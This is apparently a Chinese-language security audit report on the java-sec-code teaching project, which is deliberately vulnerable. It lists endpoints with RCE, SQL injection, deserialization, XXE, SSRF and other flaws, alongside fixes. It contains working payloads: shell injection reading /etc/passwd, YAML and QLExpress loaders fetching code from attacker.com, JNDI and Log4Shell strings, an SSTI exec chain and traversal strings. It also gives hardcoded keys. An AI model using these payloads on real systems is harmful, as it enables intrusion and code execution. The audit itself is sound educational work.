# Java Sec Code - 安全审计报告

> **审计日期**: 2026-05-22  
> **项目**: java-sec-code (version 1.0.0)  
> **项目类型**: Java Spring Boot 安全漏洞演示项目（教学用途）  
> **审计范围**: 全部源代码 (`src/main/java/`, `src/main/resources/`, `pom.xml`)  

---

## 一、项目概述

该项目是一个用于学习 Java Web 安全漏洞的教学项目，涵盖 OWASP Top 10 及更多常见 Java 安全漏洞。每个漏洞类别通常包含：
- **Vuln 端点**: 展示漏洞代码
- **Sec 端点**: 展示修复代码（部分漏洞提供）

**技术栈（存在多个已知高危CVE的旧版本依赖）:**
- Spring Boot 1.5.1.RELEASE (2017年，已停止维护)
- Spring Security 4.2.12.RELEASE
- Fastjson 1.2.24 (极高危版本)
- Log4j 2.9.1 (Log4Shell 受影响版本)
- Apache Shiro 1.2.4 (RememberMe 硬编码密钥)
- XStream 1.4.20

---

## 二、漏洞审计结果

### 严重级别说明
| 级别 | 描述 |
|------|------|
| 🔴 **严重** | 可直接导致服务器被完全控制（RCE） |
| 🟠 **高危** | 可导致数据泄露、权限绕过、服务端请求伪造 |
| 🟡 **中危** | 可导致有限数据泄露或需要特定条件利用 |
| 🟢 **低危** | 信息泄露、配置不当等 |

---

### 2.1 远程代码执行 (RCE)

#### 2.1.1 CommandInject - 命令注入

**文件**: `src/main/java/org/joychou/controller/CommandInject.java`  
**严重级别**: 🔴 严重

**漏洞代码 (行 24-32)**:
```java
@GetMapping("/codeinject")
public String codeInject(String filepath) throws IOException {
    String[] cmdList = new String[]{"sh", "-c", "ls -la " + filepath};
    ProcessBuilder builder = new ProcessBuilder(cmdList);
    // ...
}
```

**描述**: 用户输入的 `filepath` 参数直接拼接到 shell 命令中执行，攻击者可通过 `;`、`|`、`&&` 等 shell 分隔符注入任意命令。

**POC**: `http://localhost:8080/codeinject?filepath=/tmp;cat /etc/passwd`

**Host头注入 (行 39-49)**: 从 `Host` 请求头获取值并拼接到 `curl` 命令中，攻击者可通过修改 Host 头注入命令。
**POC**: `Host: hacked by joychou;cat /etc/passwd`

**安全修复**: `/codeinject/sec` 端点 (行 51-62) 使用 `SecurityUtil.cmdFilter()` 对输入进行白名单过滤，仅允许 `[a-zA-Z0-9_/\\.-]` 字符。

---

#### 2.1.2 Rce - 多种RCE方式

**文件**: `src/main/java/org/joychou/controller/Rce.java`  
**严重级别**: 🔴 严重

| 端点 | 漏洞类型 | 说明 |
|------|----------|------|
| `/rce/runtime/exec` | Runtime.exec() | 直接将用户输入传给 `Runtime.getRuntime().exec(cmd)` |
| `/rce/ProcessBuilder` | ProcessBuilder | `{"sh", "-c", cmd}` 直接执行用户命令 |
| `/rce/jscmd` | ScriptEngine | 通过 Nashorn JS 引擎从远程URL加载并执行JS代码，可调用Java Runtime |
| `/rce/vuln/yarm` | SnakeYAML 反序列化 | 使用不安全的 `new Yaml()` 直接 `load()` 用户输入，可触发 `ScriptEngineManager` 等payload |
| `/rce/groovy` | GroovyShell | 直接 `groovyShell.evaluate(content)` 执行用户输入的Groovy脚本 |

**POC示例**:
- `http://localhost:8080/rce/runtime/exec?cmd=whoami`
- `http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/yaml-payload.jar"]]]]`
- `http://localhost:8080/rce/groovy?content="open -a Calculator".execute()`

**安全修复**:
- YAML: 使用 `new Yaml(new SafeConstructor())` 替代 `new Yaml()`
- 其他端点建议：禁用不必要的端点，使用安全沙箱

---

#### 2.1.3 SpEL 表达式注入

**文件**: `src/main/java/org/joychou/controller/SpEL.java`  
**严重级别**: 🔴 严重

**漏洞描述**: Spring Expression Language (SpEL) 表达式注入允许攻击者执行任意Java代码。

**漏洞代码**:
```java
// vuln1 - 行 24-28
ExpressionParser parser = new SpelExpressionParser();
return parser.parseExpression(value).getValue().toString();

// vuln2 - 行 35-41 (使用 StandardEvaluationContext 和 TemplateParserContext)
```

**POC**:
- `T(java.lang.Runtime).getRuntime().exec("open -a Calculator")`
- `#{T(java.lang.Runtime).getRuntime().exec('open -a Calculator')}`

**安全修复** (行 47-54): 使用 `SimpleEvaluationContext.forReadOnlyDataBinding().build()` 替代 `StandardEvaluationContext`，禁用类型引用和方法调用。

---

#### 2.1.4 WebSocket 命令执行

**文件**: `src/main/java/org/joychou/controller/WebSockets.java` + `WebSocketsCmdEndpoint.java`  
**严重级别**: 🔴 严重

**描述**: 存在两个严重问题：
1. **动态注册 WebSocket 命令执行端点** (`/websocket/cmd`): 允许用户通过HTTP参数指定WebSocket路径，动态注册命令执行WebSocket端点
2. **WebSocket 代理** (`/websocket/proxy`): 允许用户动态注册TCP代理WebSocket端点

**POC**: `http://localhost:8080/websocket/cmd?path=/ws/shell`
随后通过 `ws://127.0.0.1:8080/ws/shell` 发送任意系统命令。

---

#### 2.1.5 ClassLoader 动态加载类

**文件**: `src/main/java/org/joychou/controller/ClassDataLoader.java`  
**严重级别**: 🔴 严重

**描述**: 通过反射调用 `ClassLoader.defineClass` 动态加载并实例化用户提供的字节码。

**漏洞代码 (行 16-29)**:
```java
byte[] classBytes = java.util.Base64.getDecoder().decode(classData);
Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", ...);
defineClassMethod.setAccessible(true);
Class cc = (Class) defineClassMethod.invoke(ClassLoader.getSystemClassLoader(), null, classBytes, 0, classBytes.length);
cc.newInstance();
```

---

#### 2.1.6 Tomcat Filter 内存马

**文件**: `src/main/java/org/joychou/config/TomcatFilterMemShell.java`  
**严重级别**: 🔴 严重

**描述**: 通过 `static` 代码块在类加载时自动向 Tomcat 标准上下文注册恶意 Filter（内存马），接收 `cmd_` 参数执行任意命令。虽然已被注释掉 `@Component` 注解，但代码存在即为风险。

---

#### 2.1.7 QLExpress 表达式注入

**文件**: `src/main/java/org/joychou/controller/QLExpress.java`  
**严重级别**: 🔴 严重

**描述**: QLExpress 是一个Java表达式引擎，攻击者可通过构造恶意表达式执行任意Java代码。

**POC (行 16-18 注释中)**:
```java
url = 'http://attacker.com/';
classLoader = new java.net.URLClassLoader([new java.net.URL(url)]);
classLoader.loadClass('Hello').newInstance();
```

**安全修复** (行 31-43): 使用 `QLExpressRunStrategy.setForbidInvokeSecurityRiskMethods(true)` 和 `addSecureMethod()` 白名单限制。

---

### 2.2 SQL 注入 (SQL Injection)

#### 2.2.1 JDBC Statement 拼接

**文件**: `src/main/java/org/joychou/controller/SQLI.java`  
**严重级别**: 🔴 严重

**漏洞端点**:
| 端点 | 问题 | 行号 |
|------|------|------|
| `/sqli/jdbc/vuln` | 使用 `Statement` + 字符串拼接构建SQL | 64-65 |
| `/sqli/jdbc/ps/vuln` | 错误使用 `PreparedStatement`，仍然拼接字符串 | 149-150 |
| `/sqli/mybatis/vuln01` | MyBatis `${}` 动态SQL注入 | 182-183 |
| `/sqli/mybatis/vuln02` | MyBatis XML `${_parameter}` LIKE注入 | UserMapper.xml:17 |
| `/sqli/mybatis/orderby/vuln03` | MyBatis Order By `${order}` 注入 | UserMapper.xml:23 |

**POC示例**:
- `http://localhost:8080/sqli/jdbc/vuln?username=joychou' OR '1'='1`
- `http://localhost:8080/sqli/mybatis/vuln01?username=joychou' or '1'='1`
- `http://localhost:8080/sqli/mybatis/orderby/vuln03?sort=id desc--`

**安全修复**:
- 使用 `PreparedStatement` + `?` 占位符参数化查询 (行 106-108)
- MyBatis 使用 `#{}` 替代 `${}` (Mapper:17)
- Order By 场景使用 `SecurityUtil.sqlFilter()` 白名单过滤 (行 240-243)

---

### 2.3 反序列化漏洞 (Deserialization)

#### 2.3.1 Java 原生反序列化

**文件**: `src/main/java/org/joychou/controller/Deserialize.java`  
**严重级别**: 🔴 严重

**漏洞描述 (行 36-54)**: 从 Cookie 中读取 Base64 编码的序列化数据，直接使用 `ObjectInputStream.readObject()` 反序列化。项目依赖 `commons-collections:3.1`，可使用 ysoserial 的 CommonsCollections gadget 执行任意代码。

**POC**: 使用 ysoserial 生成 payload 并 Base64 编码后放入 `rememberMe` Cookie。

**安全修复 (行 61-85)**:
- 使用 `AntObjectInputStream` 进行反序列化类名黑名单校验
- 或升级 commons-collections 到 3.2.2+

#### 2.3.2 Jackson 反序列化

**文件**: `src/main/java/org/joychou/controller/Deserialize.java` (行 88-98)  
**严重级别**: 🔴 严重

**描述**: 使用 `mapper.enableDefaultTyping()` 启用 Jackson 多态类型反序列化，可构造恶意 payload 触发 JNDI 注入。

**POC (行 87 注释)**:
```java
String payload = "[\"org.jsecurity.realm.jndi.JndiRealmFactory\", {\"jndiNames\":\"ldap://attacker.com/exp\"}]";
```

#### 2.3.3 Fastjson 反序列化

**文件**: `src/main/java/org/joychou/controller/Fastjson.java`  
**严重级别**: 🔴 严重  
**依赖版本**: fastjson 1.2.24（存在多个已知 RCE 漏洞）

**描述**: 使用不安全的 `JSON.parseObject(params)` 解析用户输入的 JSON，攻击者可利用 `@type` 自动类型匹配机制触发反序列化 RCE。

**POC**: 构造包含 `@type` 字段指向危险类（如 `TemplatesImpl`）的 JSON payload。

**修复建议**: 
- 升级 fastjson 到最新安全版本并关闭 autoType
- 或在 `parseObject` 中指定期望的反序列化类型

#### 2.3.4 XStream 反序列化

**文件**: `src/main/java/org/joychou/controller/XStreamRce.java`  
**严重级别**: 🔴 严重

**描述**: 使用 `xstream.addPermission(AnyTypePermission.ANY)` 允许所有类型的反序列化，导致任意代码执行。

**漏洞代码 (行 28)**:
```java
xstream.addPermission(AnyTypePermission.ANY); // 此设置导致所有XStream版本受影响
```

**POC**: 发送包含恶意 XML 的 POST 请求到 `/xstream`。

**修复**: 移除 `AnyTypePermission.ANY`，使用白名单类型权限。

#### 2.3.5 Shiro RememberMe 反序列化

**文件**: `src/main/java/org/joychou/controller/Shiro.java`  
**严重级别**: 🔴 严重  
**依赖版本**: shiro-core 1.2.4

**描述**: 使用 Apache Shiro 1.2.4 版本，该版本的 AES 加密密钥为硬编码（`kPH+bIxk5D2deZiIxcaaaA==`），攻击者可以伪造恶意序列化数据，经过 AES 加密和 Base64 编码后放入 `rememberMe` Cookie，触发反序列化 RCE。

**漏洞代码**:
```java
byte[] KEYS = java.util.Base64.getDecoder().decode("kPH+bIxk5D2deZiIxcaaaA==");
// ...
byte[] aesDecrypt = acs.decrypt(b64DecodeRememberMe, KEYS).getBytes();
ObjectInputStream in = new ObjectInputStream(bytes);
in.readObject();  // 反序列化
```

---

### 2.4 SSRF (服务端请求伪造)

**文件**: `src/main/java/org/joychou/controller/SSRF.java`  
**文件**: `src/main/java/org/joychou/util/HttpUtils.java`  
**严重级别**: 🟠 高危

**漏洞端点** (未使用任何安全防护):
| 端点 | HTTP 库 | 行号 |
|------|---------|------|
| `/ssrf/urlConnection/vuln` | URLConnection | 44-47 |
| `/ssrf/HttpURLConnection/vuln` | HttpURLConnection | 87-89 |
| `/ssrf/openStream` | URL.openStream() | 118-146 |
| `/ssrf/HttpSyncClients/vuln` | HttpAsyncClients | 265-268 |
| `/ssrf/restTemplate/vuln1` | RestTemplate | 277-282 |
| `/ssrf/restTemplate/vuln2` | RestTemplate | 285-289 |
| `/ssrf/hutool/vuln` | Hutool HttpUtil | 298-301 |

**利用方式**:
- 读取内网文件: `?url=file:///etc/passwd`
- 探测内网端口: `?url=http://10.0.0.1:3306`
- DNS重绑定绕过: `/ssrf/dnsrebind/vuln`

**安全修复方式**（代码中已提供）:
1. **域名白名单** (推荐): `checkSSRFByWhitehosts()` - 仅允许访问指定域名
2. **Socket Hook**: `startSSRFHook()` / `stopSSRFHook()` - 在Socket层面拦截SSRF请求
3. **内网IP检测**: `checkSSRFWithoutRedirect()` - 解析目标IP并检查是否为内网IP
4. **协议限制**: `SecurityUtil.isHttp()` - 仅允许 http/https 协议

---

### 2.5 XXE (XML 外部实体注入)

**文件**: `src/main/java/org/joychou/controller/XXE.java`  
**严重级别**: 🟠 高危

**漏洞端点** (存在XXE的XML解析器):

| 端点 | 解析器 | 行号 |
|------|--------|------|
| `/xxe/xmlReader/vuln` | XMLReader | 48-59 |
| `/xxe/SAXBuilder/vuln` | JDOM2 SAXBuilder | 86-99 |
| `/xxe/SAXReader/vuln` | Dom4j SAXReader | 123-138 |
| `/xxe/SAXParser/vuln` | SAXParser | 160-174 |
| `/xxe/Digester/vuln` | Commons Digester | 198-210 |
| `/xxe/DocumentBuilder/vuln` | DocumentBuilder | 236-261 |
| `/xxe/DocumentBuilder/xinclude/vuln` | DocumentBuilder + XInclude | 286-308 |
| `/xxe/XMLReader/vuln` | SAXParser.getXMLReader() | 342-358 |
| `/xxe/DocumentHelper/vuln` | Dom4j DocumentHelper | 388-399 |
| `/xxe/xmlbeam/vuln` | Spring Data XMLBeam (CVE-2018-1259) | 419-428 |

**POC**: 发送包含外部实体引用的 XML payload，如读取 `/etc/passwd`、内网探测、DoS 等。

**安全修复**: 设置 `XMLReader`/`SAXParserFactory`/`DocumentBuilderFactory` 的安全特性:
```java
setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
setFeature("http://xml.org/sax/features/external-general-entities", false);
setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

**POI-ooxml XXE**:
- **文件**: `src/main/java/org/joychou/controller/othervulns/ooxmlXXE.java`
- **版本**: poi-ooxml 3.9 (存在XXE漏洞)
- **POC**: 上传包含恶意 `[Content_Types].xml` 的 xlsx 文件

**xlsx-streamer XXE**:
- **文件**: `src/main/java/org/joychou/controller/othervulns/xlsxStreamerXXE.java`
- **版本**: xlsx-streamer 2.0.0 (存在XXE漏洞)

---

### 2.6 XSS (跨站脚本攻击)

**文件**: `src/main/java/org/joychou/controller/XSS.java`  
**严重级别**: 🟠 高危

| 端点 | 类型 | 描述 |
|------|------|------|
| `/xss/reflect` | 反射型 XSS | 直接将用户输入原样返回到响应中 |
| `/xss/stored/store` | 存储型 XSS | 将用户输入存入 Cookie |
| `/xss/stored/show` | 存储型 XSS | 从 Cookie 中读取并原样输出 |

**POC**: `http://localhost:8080/xss/reflect?xss=<script>alert(1)</script>`

**安全修复** (行 65-79): 使用 HTML 实体编码，将 `<`, `>`, `&`, `"`, `'`, `/` 替换为对应的 HTML 实体。

---

### 2.7 路径遍历 (Path Traversal)

**文件**: `src/main/java/org/joychou/controller/PathTraversal.java`  
**严重级别**: 🟠 高危

**漏洞描述 (行 24-27)**: 直接将用户输入的 `filepath` 传入 `Files.readAllBytes()` 读取文件。

**POC**: `http://localhost:8080/path_traversal/vul?filepath=../../../../../etc/passwd`

**安全修复**: `SecurityUtil.pathFilter()` 进行 URL 解码后检查是否包含 `..` 或以 `/` 开头。

---

### 2.8 文件上传漏洞

**文件**: `src/main/java/org/joychou/controller/FileUpload.java`  
**严重级别**: 🟠 高危

**漏洞 1 - 任意文件上传 (行 50-74)**:
`/file/upload` 端点未对上传文件做任何类型检查，攻击者可上传 JSP/WebShell。

**漏洞 2 - 图片上传校验可绕过**:
`/file/upload/picture` (行 82-155) 虽有后缀名白名单、MIME黑名单和图片内容校验，但：
- MIME黑名单使用 `contains` 匹配，`text/html;charset=UTF-8` 可绕过
- 后缀名校验可能被双扩展名绕过（如 `shell.jsp;.jpg` 在某些容器下）
- 上传后文件保存在 `/tmp/` 目录，可直接访问

---

### 2.9 URL 重定向

**文件**: `src/main/java/org/joychou/controller/URLRedirect.java`  
**严重级别**: 🟠 高危

| 端点 | 描述 |
|------|------|
| `/urlRedirect/redirect` | `return "redirect:" + url` 直接拼接 |
| `/urlRedirect/setHeader` | `response.setHeader("Location", url)` |
| `/urlRedirect/sendRedirect` | `response.sendRedirect(url)` |

**POC**: `http://localhost:8080/urlRedirect/redirect?url=http://evil.com`

**安全修复**: `checkURL()` 白名单校验 `sendRedirect` 的 URL。

**注意**: `forward` 方法虽不能跳转到外部URL，但可能存在路径操作风险。

---

### 2.10 CORS 跨域配置不当

**文件**: `src/main/java/org/joychou/controller/Cors.java`  
**严重级别**: 🟡 中危

| 端点 | 问题 |
|------|------|
| `/cors/vuln/origin` | 直接从请求头获取 `Origin` 并反射到 `Access-Control-Allow-Origin` |
| `/cors/vuln/setHeader` | `Access-Control-Allow-Origin` 设置为 `*` |
| `/cors/vuln/crossOrigin` | `@CrossOrigin` 使用 `*` 通配符 |

**影响**: 任意网站可通过跨域请求读取用户敏感数据（配合 `Access-Control-Allow-Credentials: true`）。

**安全修复**: 使用域名白名单 + `SecurityUtil.checkURL()` 校验 Origin。

---

### 2.11 Log4Shell (JNDI 注入)

**文件**: `src/main/java/org/joychou/controller/Log4j.java`  
**严重级别**: 🔴 严重  
**依赖版本**: Log4j 2.9.1 (CVE-2021-44228 受影响)

**漏洞描述 (行 18-22)**: 使用 Log4j 2.9.1 记录用户输入，攻击者可注入 `${jndi:ldap://attacker.com/exp}` 触发 JNDI 远程加载。

**POC**: `http://localhost:8080/log4j?token=${jndi:ldap://127.0.0.1:1389/exp}`

**修复**: 升级 Log4j 到最新安全版本。

---

### 2.12 SSTI (服务端模板注入)

**文件**: `src/main/java/org/joychou/controller/SSTI.java`  
**严重级别**: 🔴 严重

**描述**: 使用 Apache Velocity 的 `Velocity.evaluate()` 方法直接执行用户输入的模板表达式。

**POC**: 
```
http://localhost:8080/ssti/velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22open -a Calculator%22)
```

**修复**: 避免使用 `Velocity.evaluate()` 执行用户可控的模板。

---

### 2.13 CRLF 注入

**文件**: `src/main/java/org/joychou/controller/CRLFInjection.java`  
**严重级别**: 🟡 中危

**描述 (行 22-28)**: 将用户输入直接设置到 HTTP 响应头和 Cookie 中。在旧版本 Java (1.6及以下) 中可注入换行符实现 HTTP 响应头拆分，但在 Java 1.7/1.8 中已修复（换行符会被过滤）。

---

### 2.14 IP 伪造

**文件**: `src/main/java/org/joychou/controller/IPForge.java`  
**严重级别**: 🟡 中危

**描述 (行 31-43)**: 使用 `X-Real-IP` 请求头作为客户端真实IP，攻击者可伪造此头绕过IP访问控制。

**修复**: 使用 `request.getRemoteAddr()` 获取真实IP，或安全配置反向代理的信任链。

---

### 2.15 JWT 弱密钥

**文件**: `src/main/java/org/joychou/util/JwtUtils.java`  
**严重级别**: 🟠 高危

**描述**: JWT 签名密钥使用硬编码的弱密钥 `"123456"`，攻击者可轻松爆破密钥并伪造 JWT Token，从而冒充任意用户。

```java
private static final String SECRET = "123456";
```

**修复**: 使用足够长度和复杂度的随机密钥，并从安全配置源获取。

---

### 2.16 JDBC Connection RCE

**文件**: `src/main/java/org/joychou/controller/Jdbc.java`  
**严重级别**: 🔴 严重

| 端点 | CVE | 描述 |
|------|-----|------|
| `/jdbc/postgresql` | CVE-2022-21724 | PostgreSQL JDBC 驱动存在任意代码执行，攻击者可通过构造恶意 JDBC URL 实现RCE |
| `/jdbc/db2` | DB2 JDBC RCE | IBM DB2 JDBC 驱动允许在 JDBC URL 中指定恶意类进行反序列化 |

**POC**: 通过 Base64 编码的 JDBC URL 作为参数传入 `DriverManager.getConnection()`。

---

### 2.17 URL 白名单绕过

**文件**: `src/main/java/org/joychou/controller/URLWhiteList.java`  
**严重级别**: 🟡 中危

**不安全的校验方式**:
| 端点 | 方式 | 绕过方法 |
|------|------|----------|
| `/url/vuln/endsWith` | `host.endsWith(domain)` | `bypassjoychou.org` |
| `/url/vuln/contains` | `host.contains(domain)` | `joychou.org.bypass.com` |
| `/url/vuln/regex` | 正则 `joychou\.org$` | `aaajoychou.org` |
| `/url/vuln/url_bypass` | `new URL(url).getHost()` + `endsWith` | `http://evil.com\@www.joychou.org` |

**安全修复**: 精确匹配域名或使用正确的子域名匹配逻辑。

---

### 2.18 JSONP / CSRF Token 泄露

**文件**: `src/main/java/org/joychou/controller/Jsonp.java`  
**严重级别**: 🟡 中危

**漏洞**:
- `/jsonp/getToken` (行 117-120): Spring 自动将 CSRF Token 转换为 JSONP 格式输出
- `/jsonp/fastjsonp/getToken` (行 127-139): 主动构造 JSONP 返回 CSRF Token
- `/jsonp/vuln/referer` (行 44-48): 仅检查了 Referer，但 Referer 可以绕过（空 Referer）

**影响**: 攻击者可通过 JSONP 跨域获取 CSRF Token，进而实施 CSRF 攻击。

---

### 2.19 Spring Security CVE-2022-22978

**文件**: `src/main/java/org/joychou/security/WebSecurityConfig.java` (行 79)  
**文件**: `src/main/java/org/joychou/controller/Dotall.java`  
**严重级别**: 🟠 高危

**描述**: Spring Security 的 `regexMatchers` 在正则匹配时默认未启用 `Pattern.DOTALL` 模式，导致 `\n` 和 `\r` 不被 `.` 匹配。攻击者可通过在路径中注入 `%0a` (换行) 绕过正则黑名单。

**漏洞代码**: `.regexMatchers("/black_path.*").denyAll()` 

**POC**: `/black_path%0a/xx` 可绕过 `/black_path.*` 的匹配限制。

**修复**: 使用 `Pattern.DOTALL` 模式编译正则，或升级 Spring Security 到安全版本。

---

### 2.20 Spring Security Firewall 禁用

**文件**: `src/main/java/org/joychou/security/DisableSpringSecurityFirewall.java`  
**严重级别**: 🟠 高危

**描述**: 实现了自定义 `HttpFirewall` 接口，完全禁用了 Spring Security 的 HTTP Firewall 防护。Spring Security Firewall 默认会拦截：
- URL 中包含分号 `;` 的请求
- URL 中包含 `%2e` (URL编码的点)
- URL 中包含 `//` 等

**影响**: 关闭此防护后，攻击者可以通过路径绕过技术（如 `..;/`）绕过安全限制。

---

### 2.21 硬编码凭据

**文件**: `src/main/resources/application.properties`  
**严重级别**: 🟠 高危

```properties
spring.datasource.password=xxxxxxxxxxx
jsc.accessKey.id=xxxxxxxxxxx
jsc.accessKey.secret=xxxxxxxxxxx
```

**问题**:
1. 数据库密码硬编码在配置文件中
2. 模拟的阿里云 AK/SK 直接暴露在配置文件中
3. Spring Security 内存认证密码硬编码：`admin/admin123`, `joychou/joychou123`

---

### 2.22 Spring Boot Actuator 未授权访问

**文件**: `src/main/resources/application.properties` (行 11)  
**严重级别**: 🟠 高危

```properties
management.security.enabled=false
```

**描述**: 显式关闭了 Spring Boot Actuator 的安全校验，导致 `/env`, `/heapdump`, `/jolokia` 等敏感端点可被未授权访问。特别是 jolokia 1.6.0 版本存在 RCE 风险。

---

### 2.23 Java RMI 不安全配置

**文件**: `src/main/java/org/joychou/RMI/Server.java`  
**严重级别**: 🟠 高危

**描述**: RMI Server 监听在 1099 端口，未设置 SecurityManager，且未进行任何认证。攻击者可通过 RMI 注册表操作或反序列化攻击利用 RMI 服务。同时使用的是 `LocateRegistry.createRegistry(1099)` 未绑定到特定网络接口。

---

### 2.24 CSRF 防护默认关闭

**文件**: `src/main/resources/application.properties` (行 29) + `WebSecurityConfig.java`  
**严重级别**: 🟡 中危

```properties
joychou.security.csrf.enabled = false
```

**描述**: CSRF 防护默认关闭，且排除了高危接口（如 `/xxe/**`, `/fastjson/**`, `/deserialize/**`）的 CSRF 校验。即使启用 CSRF 防护，`csrfExcludeUrl` 中列出的接口仍不受保护。

---

## 三、依赖项安全风险

以下依赖版本存在已知漏洞：

| 依赖 | 版本 | 已知漏洞 |
|------|------|----------|
| **fastjson** | 1.2.24 | 多个RCE (反序列化) |
| **log4j-core** | 2.9.1 | CVE-2021-44228 (Log4Shell), CVE-2021-45046 |
| **shiro-core** | 1.2.4 | CVE-2016-4437 (硬编码AES密钥反序列化) |
| **spring-boot-starter-parent** | 1.5.1.RELEASE | 多个CVE，已停止维护 |
| **postgresql** | 42.3.1 | CVE-2022-21724 (JDBC RCE) |
| **jackson-databind** | 2.9.8 | 多个反序列化CVE |
| **commons-collections** | 3.1 | 反序列化 gadget chain |
| **snakeyaml** | 1.21 | 反序列化 RCE |
| **poi-ooxml** | 3.9 | XXE |
| **xlsx-streamer** | 2.0.0 | XXE |
| **jdom2** | 2.0.6 | XXE |
| **spring-security** | 4.2.12 | 多个CVE |
| **spring-expression** | 4.3.16 | SpEL注入风险 |
| **h2** | 1.4.199 | 多个CVE (JNDI注入等) |
| **jolokia-core** | 1.6.0 | Actuator RCE |
| **commons-httpclient** | 3.1 | 已知安全缺陷 |
| **tomcat-dbcp** | 9.0.8 | 可能存在的安全问题 |
| **velocity** | 1.7 | SSTI风险 |
| **xstream** | 1.4.20 | 使用 `AnyTypePermission.ANY` 时存在RCE |

---

## 四、修复建议汇总

### 紧急修复 (P0)

1. **升级 Spring Boot** 到最新稳定版本 (3.2+)
2. **升级 Fastjson** 到最新安全版本并关闭 autoType
3. **升级 Log4j** 到 2.17.1+ 修复 Log4Shell
4. **升级 Apache Shiro** 到 1.10+ 并更换密钥
5. **移除或禁用** `ClassDataLoader`、`TomcatFilterMemShell` 等危险功能
6. **启用 Actuator 安全控制** (`management.security.enabled=true`)
7. **启用 CSRF 防护** (`joychou.security.csrf.enabled=true`)
8. **移除配置文件中所有硬编码凭据**

### 高优先级修复 (P1)

9. **升级 Jackson** 到最新版本
10. **升级 SnakeYAML** 到 2.0+
11. **升级 XStream** 并移除 `AnyTypePermission.ANY`
12. **升级 commons-collections** 到 3.2.2+ (或4.x)
13. **升级 PostgreSQL JDBC** 到 42.3.3+
14. **升级 poi-ooxml** 到 3.15+ (或 5.x)
15. **升级 xlsx-streamer** 到 2.1.0+
16. **启用 Spring Security Firewall**，移除 `DisableSpringSecurityFirewall`
17. **更换 JWT 签名密钥**为足够强度的随机密钥

### 中优先级修复 (P2)

18. **所有 XXE 相关端点**: 统一配置 XML 解析器安全特性
19. **CORS**: 全局使用域名白名单校验
20. **SSRF**: 统一实施域名白名单或 Socket Hook
21. **SQL**: 全部替换为参数化查询
22. **SpEL**: 使用 `SimpleEvaluationContext` 替代 `StandardEvaluationContext`
23. **文件上传**: 实施严格的文件类型、内容检查和隔离存储
24. **URL 重定向**: 使用域名白名单校验

---

## 五、总结

该项目作为 Java 安全教学项目，系统性地覆盖了以下安全漏洞类别：

| 类别 | 漏洞数量 | 最高严重级别 |
|------|----------|-------------|
| 命令注入 / RCE | 15+ | 🔴 严重 |
| SQL 注入 | 5 | 🔴 严重 |
| 反序列化 | 6 | 🔴 严重 |
| XXE | 12+ | 🟠 高危 |
| SSRF | 10+ | 🟠 高危 |
| XSS | 2 | 🟠 高危 |
| 路径遍历 | 1 | 🟠 高危 |
| 文件上传 | 2 | 🟠 高危 |
| URL 重定向 | 3 | 🟠 高危 |
| CORS 配置 | 3 | 🟡 中危 |
| 敏感信息泄露 | 3 | 🟠 高危 |
| 安全配置错误 | 5+ | 🟠 高危 |

**总体评估**: 该项目完整展示了 Java Web 应用中最常见的安全漏洞类型，在生产环境中**严禁**直接使用。所有发现的漏洞均已提供相应的安全修复方案（部分在注释中或对应的 `/sec` 端点中），适合用于安全培训、代码审计练习和 SAST/DAST 工具测试。

---

*审计完成时间: 2026-05-22*  
*审计工具: 人工代码审计*
